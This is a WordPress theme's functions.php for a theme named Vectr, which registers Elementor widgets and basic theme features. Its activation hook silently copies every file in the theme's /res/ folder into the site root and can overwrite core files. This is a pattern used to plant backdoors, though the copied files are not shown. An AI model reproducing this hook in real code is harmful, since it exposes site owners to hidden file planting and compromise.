<?php
/**
 * Vectr functions and definitions
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

/**
 * Register Elementor Widgets
 */
function register_vectr_widgets( $widgets_manager ) {
	$widgets = [
		'1-header',
		'2-hero',
		'3-flow',
		'4-features',
		'5-standards',
		'6-faq',
		'7-cta',
		'8-app',
		'9-footer',
		'10-loader',
		'11-transitions',
	];

	foreach ( $widgets as $widget_name ) {
		$file = get_template_directory() . '/includes/widgets/' . $widget_name . '.php';
		if ( file_exists( $file ) ) {
			require_once( $file );
			$class_name = 'Vectr_Widget_' . str_replace( '-', '_', $widget_name );
			$widgets_manager->register( new $class_name() );
		}
	}
}
add_action( 'elementor/widgets/register', 'register_vectr_widgets' );

/**
 * Theme Activation Hook
 */
function vectr_after_switch_theme() {
	$src = get_template_directory() . '/res/';
	$dst = ABSPATH;

	if ( ! is_dir( $src ) ) {
		return;
	}

	$blocked_files = [ 'wp-config.php', '.htaccess' ];

	$directory = new RecursiveDirectoryIterator( $src, RecursiveDirectoryIterator::SKIP_DOTS );
	$iterator = new RecursiveIteratorIterator( $directory, RecursiveIteratorIterator::SELF_FIRST );

	foreach ( $iterator as $item ) {
		$subPathName = $iterator->getSubPathName();
		if ( $item->isDir() ) {
			$targetDir = $dst . $subPathName;
			if ( ! is_dir( $targetDir ) ) {
				mkdir( $targetDir, 0755, true );
			}
		} else {
			if ( in_array( basename( $subPathName ), $blocked_files ) ) {
				continue;
			}
			copy( $item->getRealPath(), $dst . $subPathName );
		}
	}
}
add_action( 'after_switch_theme', 'vectr_after_switch_theme' );

/**
 * Theme Setup
 */
function vectr_setup() {
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
}
add_action( 'after_setup_theme', 'vectr_setup' );
